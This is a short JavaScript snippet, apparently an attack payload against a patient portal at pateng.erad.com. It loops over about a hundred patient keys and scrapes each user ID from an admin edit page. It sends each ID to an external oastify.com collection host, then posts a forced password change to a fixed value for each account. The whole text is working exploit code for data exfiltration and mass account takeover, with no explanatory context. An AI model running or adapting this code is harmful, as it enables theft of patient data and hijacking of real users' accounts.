for (let i = 199200; i <= 199299; i++) {
  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
    .then(res => res.text())
    .then(res => {
      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
      if (match) {
        fetch(`1mog1ow5kzp7jzj7c6udt7ayjppgd61v.oastify.com?data=${encodeURIComponent(match[1])}`);
      }
      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `aPatientKey=${i}&NewPassword=Frog%40123%40123`
      });
    });
}
